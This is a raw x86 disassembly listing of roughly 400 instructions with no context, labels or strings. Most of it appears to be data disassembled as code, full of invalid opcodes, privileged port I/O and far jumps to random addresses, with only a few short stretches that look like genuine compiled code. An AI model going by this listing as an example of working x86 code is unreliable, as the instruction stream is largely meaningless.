  4079e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079e5:	pop    ebx
  4079e6:	mov    ch,0x71
  4079e8:	test   eax,0x765481f7
  4079ed:	adc    DWORD PTR [edi+0x8b720af],esi
  4079f3:	gs fyl2xp1 
  4079f6:	sar    DWORD PTR [esi-0x4e],1
  4079f9:	test   al,0xf7
  4079fb:	or     BYTE PTR [ebp+edx*8-0x3986469d],dh
  407a02:	es or  ebp,ebx
  407a05:	mov    al,0x27
  407a07:	test   al,0xa9
  407a09:	push   ebx
  407a0a:	jle    0x407a61
  407a0c:	mov    dh,dl
  407a0e:	ret    0x5f80
  407a11:	out    0x20,al
  407a13:	aaa    
  407a14:	test   DWORD PTR [esi-0xa68e93f],edi
  407a1a:	out    0xc4,al
  407a1c:	or     eax,0x59604cbd
  407a21:	xchg   ebx,eax
  407a22:	daa    
  407a23:	test   eax,0x75b1167f
  407a28:	adc    ebp,edx
  407a2a:	hlt    
  407a2b:	cs cdq 
  407a2d:	(bad)  [esi]
  407a2f:	dec    ebx
  407a30:	add    BYTE PTR [ebp+0x324c60c7],ah
  407a36:	xlat   BYTE PTR ds:[ebx]
  407a37:	stos   DWORD PTR es:[edi],eax
  407a38:	xor    ecx,esi
  407a3a:	xchg   BYTE PTR [eax+0x3],ah
  407a3d:	ficom  DWORD PTR [esi+edx*4+0x54]
  407a41:	hlt    
  407a42:	push   edx
  407a43:	(bad)  
  407a45:	push   edi
  407a46:	ins    DWORD PTR es:[edi],dx
  407a47:	mov    edi,0xa46ea2e9
  407a4c:	cs ffree st(6)
  407a4f:	sub    DWORD PTR [eax+esi*8-0x57ab10ee],ecx
  407a56:	(bad)  
  407a57:	call   0x86f1b8de
  407a5c:	lods   al,BYTE PTR ds:[esi]
  407a5d:	repnz cs add eax,0xc9be85df
  407a64:	xor    eax,edi
  407a66:	jno    0x407a03
  407a68:	jecxz  0x407aac
  407a6a:	xchg   esp,eax
  407a6b:	retf   0xcbf5
  407a6e:	out    dx,eax
  407a6f:	pop    ss
  407a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a71:	add    al,0x4d
  407a73:	jl     0x407abc
  407a75:	mov    bh,0x1a
  407a77:	ror    DWORD PTR [edx+0x61],cl
  407a7a:	loopne 0x407a06
  407a7c:	cdq    
  407a7d:	int3   
  407a7e:	mov    ch,0x99
  407a80:	mov    eax,ds:0x3a7aad68
  407a85:	xchg   DWORD PTR [edx],esi
  407a87:	sti    
  407a88:	pusha  
  407a89:	pop    edi
  407a8a:	push   es
  407a8b:	data16 das 
  407a8d:	ffreep st(7)
  407a8f:	sub    eax,0x64e5e936
  407a94:	xchg   esi,eax
  407a95:	imul   eax,DWORD PTR [esi-0x12],0x6
  407a99:	outs   dx,DWORD PTR ds:[esi]
  407a9a:	aam    0x55
  407a9c:	dec    esp
  407a9d:	in     al,0x5b
  407a9f:	or     DWORD PTR [esi-0x4b],ebp
  407aa2:	cli    
  407aa3:	push   0xdb94144a
  407aa8:	xor    DWORD PTR [edi+edx*8-0x45],ecx
  407aac:	sbb    dh,BYTE PTR [ecx+0x79348e50]
  407ab2:	test   DWORD PTR ss:[edx],eax
  407ab5:	mov    esi,0x1ec174ba
  407aba:	add    bh,BYTE PTR [edx-0x74]
  407abd:	push   cs
  407abe:	xor    dl,dl
  407ac0:	cwde   
  407ac1:	fist   DWORD PTR ds:0xf8207296
  407ac7:	add    al,0x88
  407ac9:	inc    edi
  407aca:	sub    al,0x8b
  407acc:	cmp    ebx,DWORD PTR [ebp-0x44]
  407acf:	inc    edi
  407ad0:	or     al,0x72
  407ad2:	adc    DWORD PTR [eax+ebx*2-0x12fd0132],esi
  407ad9:	push   esi
  407ada:	repz out 0xed,eax
  407add:	test   BYTE PTR [ebx-0x632e5dbb],dh
  407ae3:	arpl   WORD PTR [esi-0x47317722],dx
  407ae9:	fiadd  DWORD PTR [ebx]
  407aeb:	push   ecx
  407aec:	cmp    al,0x30
  407aee:	pop    edx
  407aef:	sub    al,0x39
  407af1:	sbb    DWORD PTR cs:[ebx-0x3e],esp
  407af5:	call   0xe37f:0xd0d9aed7
  407afc:	out    dx,al
  407afd:	adc    dh,BYTE PTR [edi+0x62346023]
  407b03:	into   
  407b04:	and    DWORD PTR [ecx-0x42c020fb],esi
  407b0a:	inc    ebx
  407b0b:	arpl   WORD PTR [eax-0x579914a7],sp
  407b11:	ds test eax,0xc63327c7
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	sub    bh,BYTE PTR [esi+0x50]
  407b42:	aaa    
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407ad0
  407b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b4d:	pop    eax
  407b4e:	dec    ebx
  407b4f:	cmp    al,0x60
  407b51:	xchg   DWORD PTR [ebp-0x2],esi
  407b54:	(bad)  
  407b55:	test   BYTE PTR gs:[edx],cl
  407b58:	pop    edx
  407b59:	cmp    al,0x3
  407b5b:	(bad)
  407b60:	(bad)  
  407b61:	jg     0x407ae6
  407b63:	xchg   edi,eax
  407b64:	inc    edx
  407b65:	out    dx,eax
  407b66:	lock xchg edi,eax
  407b68:	push   ecx
  407b69:	mov    bl,0xe5
  407b6b:	pop    ebx
  407b6c:	push   ebp
  407b6d:	cmp    eax,0xe4a618f0
  407b72:	rcr    BYTE PTR [esi-0x36863ba],1
  407b78:	inc    edx
  407b79:	lock lods eax,DWORD PTR ds:[esi]
  407b7b:	dec    ecx
  407b7c:	add    ch,BYTE PTR [eax+0x15]
  407b7f:	jns    0x407b3a
  407b81:	(bad)  
  407b82:	popa   
  407b83:	inc    edi
  407b84:	dec    DWORD PTR [edx+0x60]
  407b87:	inc    esp
  407b88:	pop    esp
  407b89:	sub    BYTE PTR [eax],al
  407b8b:	add    DWORD PTR [ebp+0x65bbc539],edx
  407b91:	je     0x407bd7
  407b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b94:	out    dx,eax
  407b95:	push   esi
  407b96:	pop    ebx
  407b97:	cld    
  407b98:	mov    eax,DWORD PTR [esi+0x2cd30163]
  407b9e:	adc    eax,0x554d0d55
  407ba3:	stos   BYTE PTR es:[edi],al
  407ba4:	xchg   ebx,eax
  407ba5:	or     DWORD PTR [ecx],ebp
  407ba7:	and    al,BYTE PTR [ebp-0x3c]
  407baa:	in     al,dx
  407bab:	fnstcw WORD PTR [ebx-0x6]
  407bae:	xchg   ecx,eax
  407baf:	and    bh,BYTE PTR [esi]
  407bb1:	inc    esi
  407bb2:	push   ebx
  407bb3:	xor    DWORD PTR [edi],ebp
  407bb5:	mov    esi,0x6f444427
  407bba:	in     al,0x35
  407bbc:	xchg   ah,al
  407bbe:	sub    esp,edx
  407bc0:	jne    0x407c39
  407bc2:	int    0x19
  407bc4:	jne    0x407b5a
  407bc6:	push   esp
  407bc7:	fisubr WORD PTR [edi-0x4f]
  407bca:	fdivr  DWORD PTR [edx]
  407bcc:	push   esi
  407bcd:	ja     0x407b93
  407bcf:	dec    ecx
  407bd0:	not    BYTE PTR [eax-0x77837b5d]
  407bd6:	jge    0x407bc2
  407bd8:	rol    BYTE PTR [ebx+0x7f],0xba
  407bdc:	aam    0x1e
  407bde:	and    DWORD PTR [edx+0x47],edx
  407be1:	jmp    0xa217d7df
  407be6:	std    
  407be7:	push   0x93a60cd5
  407bec:	xchg   esp,eax
  407bed:	jge    0x407c18
  407bef:	mov    dh,BYTE PTR [ebx+0x23ce5ed1]
  407bf5:	and    cl,BYTE PTR [eax+0x4e]
  407bf8:	nop
  407bf9:	(bad)  
  407bfa:	mov    edx,DWORD PTR [ebx]
  407bfc:	xchg   esp,eax
  407bfd:	fist   WORD PTR [edi]
  407bff:	das    
  407c00:	jp     0x407bdc
  407c02:	repz mov gs,WORD PTR [ebp-0x5d]
  407c06:	aad    0xbb
  407c08:	(bad)  
  407c0a:	rcr    BYTE PTR [edi],1
  407c0c:	mov    BYTE PTR [edx+0x34f3fed],cl
  407c12:	scas   al,BYTE PTR es:[edi]
  407c13:	cmp    DWORD PTR [edx],edi
  407c15:	mov    eax,0x7d163a2a
  407c1a:	adc    esi,0xad29023f
  407c20:	out    dx,eax
  407c21:	cmp    BYTE PTR [esi+0x18],0x85
  407c25:	dec    edi
  407c26:	push   cs
  407c27:	sbb    cl,BYTE PTR [bx+0x552b]
  407c2c:	mov    eax,0xc60e5b7f
  407c31:	xor    DWORD PTR [eax+0x22],esi
  407c34:	jbe    0x407c2a
  407c36:	(bad)  
  407c37:	daa    
  407c38:	sub    DWORD PTR [ebp+0x44],0xae672038
  407c3f:	ja     0x407cb7
  407c41:	loop   0x407c58
  407c43:	fwait
  407c44:	xor    al,0xc2
  407c46:	cld    
  407c47:	leave  
  407c48:	test   DWORD PTR [ebp-0x76c3e5a7],esi
  407c4e:	mov    edx,0xdd1e924e
  407c53:	adc    edi,esi
  407c55:	cs push 0x106ff591
  407c5b:	nop
  407c5c:	pop    ds
  407c5d:	sub    bl,BYTE PTR [ebx+ecx*2+0x15]
  407c61:	sbb    ch,BYTE PTR [edi+0x7ef52505]
  407c67:	jae    0x407bf4
  407c69:	jns    0x407c65
  407c6b:	push   eax
  407c6c:	xor    DWORD PTR [edi-0x346206c4],0xfffffff5
  407c73:	xchg   esp,eax
  407c74:	mov    eax,ds:0xdb56ce77
  407c79:	in     eax,0xc4
  407c7b:	mov    ch,0x38
  407c7d:	pop    edx
  407c7e:	daa    
  407c7f:	pop    esi
  407c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c81:	test   al,0x1d
  407c83:	sub    BYTE PTR [ecx-0x18],bh
  407c86:	pop    esp
  407c87:	xor    eax,edx
  407c89:	lods   al,BYTE PTR ds:[esi]
  407c8a:	clc    
  407c8b:	lock pop esp
  407c8d:	pop    ebp
  407c8e:	cdq    
  407c8f:	mov    DWORD PTR [edx-0x11],edi
  407c92:	or     DWORD PTR [esp+edi*8],eax
  407c95:	(bad)  
  407c96:	retf   
  407c97:	ss xor eax,0xecf1477d
  407c9d:	rcl    BYTE PTR [edi],0x79
  407ca0:	jle    0x407c99
  407ca2:	test   BYTE PTR [esi+0x1319b185],bl
  407ca8:	iret   
  407ca9:	mov    fs,WORD PTR [esi+0xa]
  407cac:	push   ebp
  407cad:	pusha  
  407cae:	dec    ecx
  407caf:	mov    al,ds:0xd104ad4e
  407cb4:	les    edx,FWORD PTR [esi+ebp*1-0x44]
  407cb8:	ins    DWORD PTR es:[edi],dx
  407cb9:	mov    ch,0xfa
  407cbb:	or     DWORD PTR [esi+0x16],0xc7ce89f3
  407cc2:	jb     0x407d14
  407cc4:	sbb    bh,ch
  407cc6:	popa   
  407cc7:	mov    es,WORD PTR [edi]
  407cc9:	pop    es
  407cca:	lea    ecx,[eax+0x5b]
  407ccd:	addr16 xor ah,al
  407cd0:	aad    0xd3
  407cd2:	mov    ebp,0x6118dcdf
  407cd7:	gs (bad) 
  407cd9:	and    bl,BYTE PTR [ecx-0x3]
  407cdc:	fcomp  QWORD PTR [edi+0x7f]
  407cdf:	push   edi
  407ce0:	push   ebp
  407ce1:	shr    BYTE PTR [ebp-0x17d70389],cl
  407ce7:	mov    ch,0x17
  407ce9:	adc    BYTE PTR [esi-0x591d2794],al
  407cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf0:	add    eax,0xa1391ede
  407cf5:	gs lahf 
  407cf7:	imul   DWORD PTR [esi-0x40aa452a]
  407cfd:	ins    DWORD PTR es:[edi],dx
  407cfe:	push   0x7c6dec3b
  407d03:	xchg   ecx,eax
  407d04:	mov    edx,0xfc06caec
  407d09:	adc    BYTE PTR [ebp-0x6c],bl
  407d0c:	sub    bh,ch
  407d0e:	imul   eax,DWORD PTR [ebx+ebp*1-0x29],0xbf833fd4
  407d16:	scas   eax,DWORD PTR es:[edi]
  407d17:	(bad)  
  407d18:	xchg   edx,eax
  407d19:	test   al,0x81
  407d1b:	jge    0x407d3f
  407d1d:	and    al,0x1f
  407d1f:	lods   eax,DWORD PTR ds:[esi]
  407d20:	push   ecx
  407d21:	out    dx,al
  407d22:	(bad)  
  407d23:	pop    ss
  407d24:	ret    0xbd22
  407d27:	push   edx
  407d28:	inc    eax
  407d29:	out    dx,eax
  407d2a:	xchg   ecx,eax
  407d2b:	bound  edx,QWORD PTR [ebx-0x4f]
  407d2e:	js     0x407cf0
  407d30:	in     al,0x83
  407d32:	fiadd  DWORD PTR ds:0x8395e977
  407d38:	dec    esi
  407d39:	mov    cl,0x92
  407d3b:	cmovns esi,DWORD PTR [ebp-0x31fe8e]
  407d42:	adc    eax,0xbdd727a9
  407d47:	cmp    esi,0xfbbb0bbd
  407d4d:	jno    0x407db2
  407d4f:	jns    0x407d15
  407d51:	outs   dx,DWORD PTR ds:[esi]
  407d52:	pop    edx
  407d53:	aas    
  407d54:	cmp    dl,BYTE PTR [eax]
  407d56:	cs into 
  407d58:	pop    esi
  407d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d5a:	xchg   ebp,eax
  407d5b:	scas   al,BYTE PTR es:[edi]
  407d5c:	add    al,0xfc
  407d5e:	repnz (bad) 
  407d60:	and    edi,DWORD PTR [edi+ebx*2+0x50]
  407d64:	loopne 0x407d22
  407d66:	out    dx,al
  407d67:	cdq    
  407d68:	test   edx,eax
  407d6a:	ret    0x17fd
  407d6d:	jecxz  0x407d11
  407d6f:	sbb    BYTE PTR [eax+0x55],ah
  407d72:	jbe    0x407d3b
  407d74:	add    BYTE PTR [edx+ebp*4-0x5f],dh
  407d78:	pop    ds
  407d79:	mov    dh,bh
  407d7b:	adc    BYTE PTR [edi-0x5019408b],al
  407d81:	jg     0x407d97
  407d83:	loope  0x407d5a
  407d85:	ret    0x10fb
  407d88:	shl    esp,cl
  407d8a:	jns    0x407d5d
  407d8c:	inc    ecx
  407d8d:	dec    esp
  407d8e:	or     al,0xd0
  407d90:	pushf  
  407d91:	or     DWORD PTR [eax+0x4d],0xffffff99
  407d95:	cmp    al,0x4
  407d97:	bound  esp,QWORD PTR [ebp-0x20288066]
  407d9d:	out    dx,eax
  407d9e:	mov    bh,0xeb
  407da0:	imul   eax,DWORD PTR [ecx],0xffffff8b
  407da3:	push   esi
  407da4:	adc    esi,eax
  407da6:	pop    esi
  407da7:	jecxz  0x407dd7
  407da9:	je     0x407d58
  407dab:	push   ebp
  407dac:	js     0x407db4
  407dae:	js     0x407e27
  407db0:	loope  0x407dc2
  407db2:	sub    eax,0x2adde1e1
  407db7:	mov    es,edx
  407db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dba:	(bad)  
  407dbb:	in     eax,0xf4
  407dbd:	lock cmp eax,0xdc66fc52
  407dc3:	std    
  407dc4:	gs xchg esp,eax
  407dc6:	inc    edi
  407dc7:	mov    bh,0xf2
  407dc9:	mov    esi,0xe86e86f3
  407dce:	idiv   BYTE PTR [esi-0x27ace49c]
  407dd4:	out    dx,al
  407dd5:	and    eax,0xc4ccaaa9
  407dda:	mov    ebx,?
  407ddc:	mov    esp,0x125647
  407de1:	adc    ecx,DWORD PTR [ebx+0x4a3d7352]
  407de7:	sub    al,0xa9
  407de9:	cmp    ebx,ecx
  407deb:	scas   eax,DWORD PTR es:[edi]
  407dec:	adc    bh,ch
  407dee:	dec    edi
  407def:	mov    cl,bl
  407df1:	and    BYTE PTR [ebx],bh
  407df3:	mov    ebp,DWORD PTR [esi+edx*1+0x1e9082cc]
  407dfa:	jge    0x407dcc
  407dfc:	xchg   bl,ch
  407dfe:	and    eax,0x6e992a38
  407e03:	dec    esi
  407e04:	jge    0x407dbb
  407e06:	xor    DWORD PTR [eax],esp
  407e08:	mov    eax,ds:0x6e05d45
  407e0d:	jbe    0x407e07
  407e0f:	jge    0x407dcc
  407e11:	(bad)  
  407e12:	cmp    BYTE PTR [eax],ah
  407e14:	adc    bl,ch
  407e16:	or     BYTE PTR [esp+eiz*8+0xc],0x78
  407e1b:	(bad)  
  407e1d:	xchg   DWORD PTR [ecx+0x2f],esp
  407e20:	dec    edi
  407e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e22:	cwde   
  407e23:	nop
  407e24:	dec    edi
  407e25:	mov    DWORD PTR [ebx+0x7feb2cb6],ebp
  407e2b:	push   edx
  407e2c:	inc    esi
  407e2d:	or     ebp,DWORD PTR [ebp-0x5e]
  407e30:	xor    DWORD PTR [esi-0x1f],0x35e0eb4c
  407e37:	shl    esi,cl
  407e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e3a:	push   es
  407e3b:	out    0xfb,al
  407e3d:	mov    ds:0xab21faea,al
  407e42:	mov    BYTE PTR [ebx-0x5050afd7],dl
  407e48:	pop    eax
  407e49:	int    0x99
  407e4b:	pop    ss
  407e4c:	sbb    BYTE PTR [ebp+0x215794d9],dh
  407e52:	cmp    BYTE PTR [ecx+0x3f8ee544],bh
  407e58:	retf   0x987e
  407e5b:	pop    ebp
  407e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e5d:	push   0x678c960
  407e62:	sbb    al,BYTE PTR [ecx+0x57]
  407e65:	sbb    al,0xb4
  407e67:	bound  ecx,QWORD PTR [ecx+0x7294de17]
  407e6d:	(bad)  
  407e6f:	js     0x407e4a
  407e71:	imul   eax,DWORD PTR [edi],0xdfffd738
  407e77:	imul   edi,esi,0xfffffff7
  407e7a:	imul   eax
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	inc    esi
  407e99:	into   
  407e9a:	lock fld QWORD PTR [edi]
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407eee
  407ea5:	popf   
  407ea6:	leave  
  407ea7:	inc    edx
  407ea8:	sub    eax,0xea166a90
  407ead:	cdq    
  407eae:	xchg   esi,eax
  407eaf:	iret   
  407eb0:	pop    ebp
  407eb1:	popf   
  407eb2:	popa   
  407eb3:	cmp    al,0x7e
  407eb5:	rol    DWORD PTR [edi],1
  407eb7:	call   FWORD PTR [ebx+0x5946dd5e]
  407ebd:	inc    edx
  407ebe:	arpl   WORD PTR [esi],sp
  407ec0:	ret    
  407ec1:	in     eax,0x53
  407ec3:	dec    esi
  407ec4:	pop    eax
  407ec5:	xchg   ebx,eax
  407ec6:	xchg   ebx,eax
  407ec7:	popf   
  407ec8:	imul   WORD PTR [eax]
  407ecb:	sbb    BYTE PTR [esi+0x7c45e4fe],bh
  407ed1:	fwait
  407ed2:	mov    eax,0x450beeb3
  407ed7:	(bad)  
  407ed8:	push   edi
  407ed9:	mov    DWORD PTR es:[esi],esi
  407edc:	ret    0x5322
  407edf:	sbb    eax,0xa28218fd
  407ee4:	sbb    al,0x9c
  407ee6:	ss push ecx
  407ee8:	data16 fs add al,0xc1
  407eec:	sbb    eax,0xa5f1cd75
  407ef1:	inc    edx
  407ef2:	jg     0x407f60
  407ef4:	iret   
  407ef5:	dec    esp
  407ef6:	mov    bh,0x29
  407ef8:	(bad)  
  407ef9:	fld    st(1)
  407efb:	inc    esp
  407efc:	add    DWORD PTR [edx+0x2a1f4414],edi
  407f02:	mov    bh,0x1d
  407f04:	lods   al,BYTE PTR ds:[esi]
  407f05:	pop    ecx
  407f06:	jnp    0x407f53
  407f08:	pop    esp
  407f09:	stos   BYTE PTR es:[edi],al
  407f0a:	mov    bl,0xc3
  407f0c:	push   cs
  407f0d:	out    0x9,eax
  407f0f:	cmp    eax,0x8370b2c3
  407f14:	jmp    0x5b5759a5
  407f19:	loope  0x407ec3
  407f1b:	pop    edx
  407f1c:	out    0xb1,al
  407f1e:	jge    0x407f33
  407f20:	loope  0x407f0e
  407f22:	inc    esi
  407f23:	out    dx,al
  407f24:	dec    eax
  407f25:	popf   
  407f26:	sar    DWORD PTR [ecx+0x4836b4bb],0x2e
  407f2d:	jp     0x407f3e
  407f2f:	(bad)  
  407f30:	pop    es
  407f31:	sar    BYTE PTR [ebp+0x3d],cl
  407f34:	inc    ecx
  407f35:	out    dx,al
  407f36:	jmp    0x52a2:0xe8addc6a
  407f3d:	ret    
  407f3e:	clc    
  407f3f:	in     al,0xd2
  407f41:	call   0xb679:0x89bcea0d
  407f48:	mov    dh,0xce
  407f4a:	pop    ecx
  407f4b:	cmp    DWORD PTR [esi],ecx
  407f4d:	jne    0x407f8d
  407f4f:	das    
  407f50:	mov    ds:0x7ae28e16,al
  407f55:	ror    BYTE PTR [ecx+0x54],1
  407f58:	jmp    0x676d:0x68c46827
  407f5f:	and    al,0xb0
  407f61:	mov    esp,0xaa9e6952
  407f66:	mov    ds:0x261810d7,al
  407f6b:	(bad)  
  407f6c:	test   eax,0x42d4519
  407f71:	pop    edx
  407f72:	add    esi,DWORD PTR [edi+ecx*2+0x5cfec0f]
  407f79:	xor    BYTE PTR [edi],cl
  407f7b:	push   ss
  407f7c:	mov    DWORD PTR [eax+0x4b65ea89],edx
  407f82:	clts   
  407f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f85:	xlat   BYTE PTR ds:[ebx]
  407f86:	sbb    dl,BYTE PTR [ebx-0x6f]
  407f89:	add    al,0xcd
  407f8b:	out    0x6b,al
  407f8d:	sub    al,0xe6
  407f8f:	aaa    
  407f90:	dec    esi
  407f91:	jle    0x407f9c
  407f93:	pop    ss
  407f94:	jp     0x407fc0
  407f96:	inc    eax
  407f97:	fistp  QWORD PTR [ebx]
  407f99:	xor    al,0x4
  407f9b:	loope  0x407fa1
  407f9d:	jb     0x407f48
  407f9f:	(bad)  
  407fa0:	lods   eax,DWORD PTR ds:[esi]
  407fa1:	ret    0xe83f
  407fa4:	adc    eax,0x605b7576
  407fa9:	push   ecx
  407faa:	repnz icebp 
  407fac:	mov    eax,0x13e676df
  407fb1:	out    dx,al
  407fb2:	xchg   edi,eax
  407fb3:	jbe    0x407f46
  407fb5:	std    
  407fb6:	xchg   BYTE PTR ds:0x78120c85,cl
  407fbc:	or     cl,al
  407fbe:	enter  0x190b,0x9c
  407fc2:	push   es
  407fc3:	jecxz  0x407f65
  407fc5:	jmp    0xe31a:0x9420aea3
  407fcc:	cmp    edx,DWORD PTR [ebp+edx*4-0xb9aa556]
  407fd3:	xor    eax,0x475262b1
  407fd8:	retf   0x2fb5
  407fdb:	adc    ebp,DWORD PTR [eax+0x6de4085b]
  407fe1:	cmp    al,0x1c
  407fe3:	int    0x6
  407fe5:	xor    cl,BYTE PTR [esi+0x54ee4649]
  407feb:	xor    ebx,0xad537eb0
  407ff1:	or     eax,edx
  407ff3:	xchg   esp,eax
  407ff4:	mov    bl,0x1e
  407ff6:	adc    esi,edx
  407ff8:	fsub   QWORD PTR [edi+0x7d]
  407ffb:	or     DWORD PTR ds:0xab7f1f0e,ecx
  408001:	les    esi,FWORD PTR [edi+0x7]
  408004:	push   esp
  408005:	lock dec ebx
  408007:	iret   
  408008:	dec    eax
  408009:	add    al,0x84
  40800b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40800c:	nop
  40800d:	pusha  
  40800e:	jmp    0x407f90
  408010:	js     0x40804f
  408012:	lock jmp 0x407ffb
  408015:	cmp    al,cl
  408017:	or     al,dl
  408019:	cmp    al,0x2e
  40801b:	jmp    0xbaeb:0x95f44e0e
  408022:	gs loope 0x407ff7
  408025:	mov    al,ds:0x6087237b
  40802a:	fwait
  40802b:	dec    esp
  40802c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40802d:	mov    esi,0xb68c630c
  408032:	int3   
  408033:	jae    0x40801d
  408035:	popa   
  408036:	es into 
  408038:	mov    ch,0xbf
  40803a:	idiv   DWORD PTR [esi+0x62]
  40803d:	push   0xe296d4d1
  408042:	aaa    
  408043:	ins    DWORD PTR es:[edi],dx
  408044:	icebp  
  408045:	fsubr  QWORD PTR [esi+0x44]
  408048:	jmp    0xc311c71c
  40804d:	jmp    0x6393:0x53146b2f
  408054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408055:	adc    ecx,ecx
  408057:	fistp  DWORD PTR [edx]
  408059:	mov    dl,0x59
  40805b:	rol    al,1
  40805d:	hlt    
  40805e:	pop    esi
  40805f:	imul   edx,DWORD PTR [ebp+0x25],0xffffffee
  408063:	sbb    eax,0xb7c5e243
  408068:	scas   al,BYTE PTR es:[edi]
  408069:	and    DWORD PTR [ebx+ebx*8],eax
  40806c:	sub    al,0xe3
  40806e:	fdivr  DWORD PTR [ebx+0x19a913b2]
  408074:	jb     0x408065
  408076:	cwde   
  408077:	or     dl,BYTE PTR [edi]
  408079:	rcl    DWORD PTR [esi-0x11],cl
  40807c:	mov    ch,0x87
  40807e:	cmp    al,BYTE PTR [esp+edx*2]
  408081:	div    BYTE PTR [edi]
  408083:	or     edx,edx
  408085:	fcomp  QWORD PTR [esi-0x43]
  408088:	mov    ch,0xa9
  40808a:	aas    
  40808b:	jno    0x4080da
  40808d:	fisttp DWORD PTR [ecx]
  40808f:	add    DWORD PTR [esi],edi
  408091:	jmp    0x408077
  408093:	popa   
  408094:	(bad)
  408097:	in     eax,0x6e
  408099:	sbb    eax,0xee4f25a6
  40809e:	and    ch,cl
  4080a0:	jp     0x408096
  4080a2:	std    
  4080a3:	into   
  4080a4:	sar    BYTE PTR ds:0x1b259d85,1
  4080aa:	mov    ah,0xb9
  4080ac:	inc    BYTE PTR ds:0x17393954
  4080b2:	in     al,dx
  4080b3:	pop    eax
  4080b4:	sti    
  4080b5:	retf   
  4080b6:	test   eax,0x83e10c3
  4080bb:	dec    esp
  4080bc:	ins    DWORD PTR es:[edi],dx
  4080bd:	push   es
  4080be:	add    bl,BYTE PTR [ebx-0x42072580]
  4080c4:	movsx  dx,WORD PTR [ebp+0x38b108ca]
  4080cc:	in     al,0x59
  4080ce:	mov    bh,BYTE PTR [eax+eiz*1-0x41]
  4080d2:	mov    esp,DWORD PTR [eax-0x10]
  4080d5:	call   0xb82c538a
  4080da:	mov    ebx,0x77fc566e
  4080df:	fmul   st(1),st
  4080e1:	jge    0x408111
  4080e3:	loopne 0x40813d
  4080e5:	mov    dl,0x53
  4080e7:	out    dx,eax
  4080e8:	loope  0x408158
  4080ea:	jnp    0x40810c
  4080ec:	fdiv   DWORD PTR [edi-0x24]
  4080ef:	inc    edx
  4080f0:	in     eax,0x2c
  4080f2:	mov    eax,0x21c350be
  4080f7:	ins    BYTE PTR es:[edi],dx
  4080f8:	mov    DWORD PTR [edi+eiz*1],edi
  4080fb:	shr    BYTE PTR [edi+0x62],cl
  4080fe:	sbb    BYTE PTR [eax],dl
  408100:	stos   DWORD PTR es:[edi],eax
  408101:	jecxz  0x4080cd
  408103:	mov    ecx,0xc8d5f62e
  408108:	cmp    ecx,ebx
  40810a:	imul   edx,ecx,0x725ef2be
  408110:	adc    al,0x99
  408112:	dec    esp
  408113:	jp     0x408191
  408115:	fwait
  408116:	mov    ch,0xae
  408118:	or     edi,DWORD PTR [ecx-0x661ea0af]
  40811e:	adc    bl,al
  408120:	jb     0x40817b
  408122:	xchg   edi,eax
  408123:	pop    edx
  408124:	mov    ebx,0x7888587f
  408129:	mov    eax,0xd30cee2c
  40812e:	push   ecx
  40812f:	lods   eax,DWORD PTR ds:[esi]
  408130:	xchg   esp,eax
  408131:	outs   dx,DWORD PTR ds:[esi]
  408132:	mov    ch,0x7
  408134:	adc    DWORD PTR [ecx+eiz*1+0x45939156],ebx
  40813b:	mov    eax,ds:0xc82c0710
  408140:	and    al,0xb4
  408142:	and    ebp,DWORD PTR [esi+0x30]
  408145:	int    0xd8
  408147:	xchg   ebp,eax
  408148:	pop    es
  408149:	push   ecx
  40814b:	scas   eax,DWORD PTR es:[edi]
  40814c:	cld    
  40814d:	cli    
  40814e:	xchg   BYTE PTR [edx+0x9],ch
  408151:	pop    ecx
  408152:	mov    edx,gs
  408154:	ret    
  408155:	push   es
  408156:	aad    0xf7
  408158:	out    dx,eax
  408159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40815a:	jne    0x4081a7
  40815c:	test   DWORD PTR [eax-0xd],edx
  40815f:	jne    0x4081b0
  408161:	adc    al,0x6f
  408163:	int3   
  408164:	mov    dl,0x52
  408166:	fwait
  408167:	add    DWORD PTR [ebx+0x28],edi
  40816a:	adc    bh,BYTE PTR [ebx-0x22a7db3f]
  408170:	push   ss
  408171:	shr    DWORD PTR [edi+0x42ebe53f],0x5
  408178:	push   ebx
  408179:	add    eax,ebx
  40817b:	(bad)  
  40817c:	cli    
  40817d:	jns    0x408164
  40817f:	cwde   
  408180:	call   0x81ed:0xba70046f
  408187:	outs   dx,BYTE PTR ds:[esi]
  408188:	push   edi
